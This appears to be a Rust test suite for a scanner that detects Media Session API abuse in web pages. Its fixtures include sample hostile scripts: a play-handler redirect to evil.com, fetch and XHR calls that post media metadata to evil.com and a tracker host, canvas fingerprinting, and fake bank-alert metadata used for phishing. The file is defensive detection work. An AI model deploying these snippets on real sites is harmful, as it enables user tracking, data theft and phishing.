use crate::media_session_audit::*;

#[test]
fn no_media_session_no_issues() {
    assert!(analyze_media_session("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_api_navigator() {
    let body = r#"<script>navigator.mediaSession.metadata = new MediaMetadata({});</script>"#;
    let issues = analyze_media_session(body);
    assert!(issues.contains(&MediaSessionIssue::ApiDetected));
}

#[test]
fn detects_api_class() {
    let body = r#"<script>if ('MediaSession' in navigator) {}</script>"#;
    let issues = analyze_media_session(body);
    assert!(issues.contains(&MediaSessionIssue::ApiDetected));
}

#[test]
fn detects_metadata_spoofing() {
    let body = r#"<script>
        navigator.mediaSession.metadata = new MediaMetadata({
            title: "Fake Bank Alert", artist: "Security"
        });
    </script>"#;
    let issues = analyze_media_session(body);
    assert!(issues.contains(&MediaSessionIssue::MetadataSpoofing));
}

#[test]
fn detects_action_hijacking() {
    let body = r#"<script>
        navigator.mediaSession.setActionHandler("play", () => {
            window.location = "https://evil.com";
        });
    </script>"#;
    let issues = analyze_media_session(body);
    assert!(issues.contains(&MediaSessionIssue::ActionHijacking));
}

#[test]
fn no_hijacking_without_handler() {
    let body = r#"<script>navigator.mediaSession.metadata = new MediaMetadata({});</script>"#;
    let issues = analyze_media_session(body);
    assert!(!issues.contains(&MediaSessionIssue::ActionHijacking));
}

#[test]
fn detects_external_artwork() {
    let body = r#"<script>
        navigator.mediaSession.metadata = new MediaMetadata({
            artwork: [{src: "https://tracker.com/pixel.png"}]
        });
    </script>"#;
    let issues = analyze_media_session(body);
    assert!(issues.contains(&MediaSessionIssue::ExternalArtwork));
}

#[test]
fn no_external_without_url() {
    let body = r#"<script>
        navigator.mediaSession.metadata = new MediaMetadata({
            artwork: [{src: "/local/art.png"}]
        });
    </script>"#;
    let issues = analyze_media_session(body);
    assert!(!issues.contains(&MediaSessionIssue::ExternalArtwork));
}

#[test]
fn detects_silent_playback() {
    let body = r#"<script>
        const a = new Audio("/track.mp3");
        a.volume = 0;
        navigator.mediaSession.metadata = new MediaMetadata({title: "bg"});
    </script>"#;
    let issues = analyze_media_session(body);
    assert!(issues.contains(&MediaSessionIssue::SilentPlayback));
}

#[test]
fn detects_position_tracking() {
    let body = r#"<script>
        navigator.mediaSession.setPositionState({duration: 300, position: 10});
    </script>"#;
    let issues = analyze_media_session(body);
    assert!(issues.contains(&MediaSessionIssue::PositionTracking));
}

#[test]
fn no_position_without_call() {
    let body = r#"<script>navigator.mediaSession.metadata = new MediaMetadata({});</script>"#;
    let issues = analyze_media_session(body);
    assert!(!issues.contains(&MediaSessionIssue::PositionTracking));
}

#[test]
fn severity_hijacking_highest() {
    assert_eq!(
        media_session_severity(&MediaSessionIssue::ActionHijacking),
        6.5
    );
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(media_session_severity(&MediaSessionIssue::ApiDetected), 2.0);
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        MediaSessionIssue::ApiDetected,
        MediaSessionIssue::ActionHijacking,
    ];
    let mut seq = 0;
    let ops = media_session_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(MediaSessionIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        MediaSessionIssue::MetadataSpoofing.to_string(),
        "metadata_spoofing"
    );
    assert_eq!(
        MediaSessionIssue::ActionHijacking.to_string(),
        "action_hijacking"
    );
    assert_eq!(
        MediaSessionIssue::ExternalArtwork.to_string(),
        "external_artwork"
    );
    assert_eq!(
        MediaSessionIssue::SilentPlayback.to_string(),
        "silent_playback"
    );
    assert_eq!(
        MediaSessionIssue::PositionTracking.to_string(),
        "position_tracking"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_media_session("").is_empty());
}

#[test]
pub fn security_empty_body_no_issues() {
    assert!(analyze_media_session_security("").is_empty());
}

#[test]
pub fn security_no_keywords_no_issues() {
    assert!(analyze_media_session_security("<html><body>hello world</body></html>").is_empty());
}

#[test]
pub fn security_detects_hijack() {
    let body = r#"<script>
        navigator.mediaSession.setActionHandler("play", () => {
            window.location = "https://evil.com";
        });
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionHijack));
}

#[test]
pub fn security_no_hijack_without_redirect() {
    let body = r#"<script>
        navigator.mediaSession.setActionHandler("play", () => {
            console.log("playing");
        });
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(!issues.contains(&MediaSessionSecurityIssue::MediaSessionHijack));
}

#[test]
pub fn security_detects_exfiltration_fetch() {
    let body = r#"<script>
        const state = navigator.mediaSession.playbackState;
        fetch("https://tracker.com/log", {
            method: "POST",
            body: JSON.stringify({state: state})
        });
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionExfiltration));
}

#[test]
pub fn security_detects_exfiltration_xhr() {
    let body = r#"<script>
        const metadata = navigator.mediaSession.metadata;
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "https://evil.com/collect");
        xhr.send(JSON.stringify(metadata));
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionExfiltration));
}

#[test]
pub fn security_no_exfiltration_without_network() {
    let body = r#"<script>
        const state = navigator.mediaSession.playbackState;
        console.log(state);
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(!issues.contains(&MediaSessionSecurityIssue::MediaSessionExfiltration));
}

#[test]
pub fn security_detects_fingerprinting() {
    let body = r#"<script>
        const state = navigator.mediaSession.playbackState;
        const canvas = document.createElement("canvas");
        const fingerprint = state + canvas.toDataURL();
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionFingerprinting));
}

#[test]
pub fn security_no_fingerprinting_without_indicators() {
    let body = r#"<script>
        const state = navigator.mediaSession.playbackState;
        console.log(state);
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(!issues.contains(&MediaSessionSecurityIssue::MediaSessionFingerprinting));
}

#[test]
pub fn security_detects_cross_origin() {
    let body = r#"<script>
        const metadata = navigator.mediaSession.metadata;
        window.opener.postMessage(metadata, "*");
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionCrossOrigin));
}

#[test]
pub fn security_no_cross_origin_without_postmessage() {
    let body = r#"<script>
        const metadata = navigator.mediaSession.metadata;
        console.log(metadata);
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(!issues.contains(&MediaSessionSecurityIssue::MediaSessionCrossOrigin));
}

#[test]
pub fn security_detects_persistence_localstorage() {
    let body = r#"<script>
        const state = navigator.mediaSession.playbackState;
        localStorage.setItem("media_state", state);
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionPersistence));
}

#[test]
pub fn security_detects_persistence_sessionstorage() {
    let body = r#"<script>
        const metadata = navigator.mediaSession.metadata;
        sessionStorage.setItem("media_meta", JSON.stringify(metadata));
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionPersistence));
}

#[test]
pub fn security_detects_persistence_indexeddb() {
    let body = r#"<script>
        const request = indexedDB.open("MediaDB");
        request.onsuccess = () => {
            const tx = request.result.transaction("media", "readwrite");
            tx.objectStore("media").add({state: navigator.mediaSession.playbackState});
        };
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionPersistence));
}

#[test]
pub fn security_no_persistence_without_storage() {
    let body = r#"<script>
        const state = navigator.mediaSession.playbackState;
        console.log(state);
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(!issues.contains(&MediaSessionSecurityIssue::MediaSessionPersistence));
}

#[test]
pub fn security_detects_in_background() {
    let body = r#"<script>
        document.addEventListener("visibilitychange", () => {
            if (document.hidden) {
                navigator.mediaSession.playbackState = "playing";
            }
        });
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionInBackground));
}

#[test]
pub fn security_no_background_without_hidden_check() {
    let body = r#"<script>
        navigator.mediaSession.playbackState = "playing";
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(!issues.contains(&MediaSessionSecurityIssue::MediaSessionInBackground));
}

#[test]
pub fn security_detects_fake_metadata_bank() {
    let body = r#"<script>
        navigator.mediaSession.metadata = new MediaMetadata({
            title: "Bank of America Security Alert",
            artist: "Security Team"
        });
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionFakeMetadata));
}

#[test]
pub fn security_detects_fake_metadata_alert() {
    let body = r#"<script>
        navigator.mediaSession.metadata = new MediaMetadata({
            title: "Critical Alert - Click Here"
        });
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionFakeMetadata));
}

#[test]
pub fn security_no_fake_metadata_without_keywords() {
    let body = r#"<script>
        navigator.mediaSession.metadata = new MediaMetadata({
            title: "Song Title",
            artist: "Artist Name"
        });
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(!issues.contains(&MediaSessionSecurityIssue::MediaSessionFakeMetadata));
}

#[test]
pub fn security_detects_position_tracking() {
    let body = r#"<script>
        setInterval(() => {
            navigator.mediaSession.setPositionState({
                duration: 300,
                position: getCurrentPosition()
            });
        }, 1000);
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionPositionTracking));
}

#[test]
pub fn security_no_position_tracking_without_interval() {
    let body = r#"<script>
        navigator.mediaSession.setPositionState({duration: 300, position: 0});
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(!issues.contains(&MediaSessionSecurityIssue::MediaSessionPositionTracking));
}

#[test]
pub fn security_detects_without_user_action() {
    let body = r#"<script>
        navigator.mediaSession.metadata = new MediaMetadata({title: "Auto"});
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionWithoutUserAction));
}

#[test]
pub fn security_no_without_user_action_when_event_present() {
    let body = r#"<script>
        document.addEventListener("click", () => {
            navigator.mediaSession.metadata = new MediaMetadata({title: "User"});
        });
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(!issues.contains(&MediaSessionSecurityIssue::MediaSessionWithoutUserAction));
}

#[test]
pub fn security_detects_notification_abuse() {
    let body = r#"<script>
        navigator.mediaSession.metadata = new MediaMetadata({title: "Playing"});
        new Notification("You have a new message");
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionNotificationAbuse));
}

#[test]
pub fn security_no_notification_abuse_without_notification() {
    let body = r#"<script>
        navigator.mediaSession.metadata = new MediaMetadata({title: "Playing"});
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(!issues.contains(&MediaSessionSecurityIssue::MediaSessionNotificationAbuse));
}

#[test]
pub fn security_display_hijack() {
    assert_eq!(
        MediaSessionSecurityIssue::MediaSessionHijack.to_string(),
        "media_session_hijack"
    );
}

#[test]
pub fn security_display_exfiltration() {
    assert_eq!(
        MediaSessionSecurityIssue::MediaSessionExfiltration.to_string(),
        "media_session_exfiltration"
    );
}

#[test]
pub fn security_display_fingerprinting() {
    assert_eq!(
        MediaSessionSecurityIssue::MediaSessionFingerprinting.to_string(),
        "media_session_fingerprinting"
    );
}

#[test]
pub fn security_display_cross_origin() {
    assert_eq!(
        MediaSessionSecurityIssue::MediaSessionCrossOrigin.to_string(),
        "media_session_cross_origin"
    );
}

#[test]
pub fn security_display_persistence() {
    assert_eq!(
        MediaSessionSecurityIssue::MediaSessionPersistence.to_string(),
        "media_session_persistence"
    );
}

#[test]
pub fn security_display_in_background() {
    assert_eq!(
        MediaSessionSecurityIssue::MediaSessionInBackground.to_string(),
        "media_session_in_background"
    );
}

#[test]
pub fn security_display_fake_metadata() {
    assert_eq!(
        MediaSessionSecurityIssue::MediaSessionFakeMetadata.to_string(),
        "media_session_fake_metadata"
    );
}

#[test]
pub fn security_display_position_tracking() {
    assert_eq!(
        MediaSessionSecurityIssue::MediaSessionPositionTracking.to_string(),
        "media_session_position_tracking"
    );
}

#[test]
pub fn security_display_without_user_action() {
    assert_eq!(
        MediaSessionSecurityIssue::MediaSessionWithoutUserAction.to_string(),
        "media_session_without_user_action"
    );
}

#[test]
pub fn security_display_notification_abuse() {
    assert_eq!(
        MediaSessionSecurityIssue::MediaSessionNotificationAbuse.to_string(),
        "media_session_notification_abuse"
    );
}

#[test]
pub fn security_severity_hijack_highest() {
    assert_eq!(
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionHijack),
        9.0
    );
}

#[test]
pub fn security_severity_exfiltration() {
    assert_eq!(
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionExfiltration),
        8.5
    );
}

#[test]
pub fn security_severity_notification_abuse() {
    assert_eq!(
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionNotificationAbuse),
        7.5
    );
}

#[test]
pub fn security_severity_fake_metadata() {
    assert_eq!(
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionFakeMetadata),
        7.0
    );
}

#[test]
pub fn security_severity_cross_origin() {
    assert_eq!(
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionCrossOrigin),
        6.5
    );
}

#[test]
pub fn security_severity_fingerprinting() {
    assert_eq!(
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionFingerprinting),
        6.0
    );
}

#[test]
pub fn security_severity_persistence() {
    assert_eq!(
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionPersistence),
        5.5
    );
}

#[test]
pub fn security_severity_position_tracking() {
    assert_eq!(
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionPositionTracking),
        5.0
    );
}

#[test]
pub fn security_severity_in_background() {
    assert_eq!(
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionInBackground),
        4.5
    );
}

#[test]
pub fn security_severity_without_user_action_lowest() {
    assert_eq!(
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionWithoutUserAction),
        3.0
    );
}

#[test]
pub fn security_to_operations_creates_entries() {
    let issues = vec![
        MediaSessionSecurityIssue::MediaSessionHijack,
        MediaSessionSecurityIssue::MediaSessionExfiltration,
    ];
    let mut seq = 0;
    let ops = media_session_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
pub fn security_to_operations_empty_vec() {
    let issues = vec![];
    let mut seq = 0;
    let ops = media_session_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 0);
    assert_eq!(seq, 0);
}

#[test]
pub fn security_multiple_issues_detected() {
    let body = r#"<script>
        navigator.mediaSession.metadata = new MediaMetadata({title: "Bank Alert"});
        localStorage.setItem("state", navigator.mediaSession.playbackState);
        fetch("https://evil.com/track", {method: "POST", body: "data"});
    </script>"#;
    let issues = analyze_media_session_security(body);
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionFakeMetadata));
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionPersistence));
    assert!(issues.contains(&MediaSessionSecurityIssue::MediaSessionExfiltration));
}

#[test]
pub fn security_all_variants_have_different_severities() {
    let hijack = media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionHijack);
    let exfil =
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionExfiltration);
    let notif =
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionNotificationAbuse);
    let fake =
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionFakeMetadata);
    let cross =
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionCrossOrigin);
    let finger =
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionFingerprinting);
    let persist =
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionPersistence);
    let pos =
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionPositionTracking);
    let bg = media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionInBackground);
    let nouser =
        media_session_security_severity(&MediaSessionSecurityIssue::MediaSessionWithoutUserAction);

    assert!(hijack > exfil);
    assert!(exfil > notif);
    assert!(notif > fake);
    assert!(fake > cross);
    assert!(cross > finger);
    assert!(finger > persist);
    assert!(persist > pos);
    assert!(pos > bg);
    assert!(bg > nouser);
}

#[test]
pub fn security_severity_in_valid_range() {
    let variants = vec![
        MediaSessionSecurityIssue::MediaSessionHijack,
        MediaSessionSecurityIssue::MediaSessionExfiltration,
        MediaSessionSecurityIssue::MediaSessionFingerprinting,
        MediaSessionSecurityIssue::MediaSessionCrossOrigin,
        MediaSessionSecurityIssue::MediaSessionPersistence,
        MediaSessionSecurityIssue::MediaSessionInBackground,
        MediaSessionSecurityIssue::MediaSessionFakeMetadata,
        MediaSessionSecurityIssue::MediaSessionPositionTracking,
        MediaSessionSecurityIssue::MediaSessionWithoutUserAction,
        MediaSessionSecurityIssue::MediaSessionNotificationAbuse,
    ];

    for variant in variants {
        let severity = media_session_security_severity(&variant);
        assert!(severity >= 3.0, "Severity {} below 3.0", severity);
        assert!(severity <= 9.0, "Severity {} above 9.0", severity);
    }
}
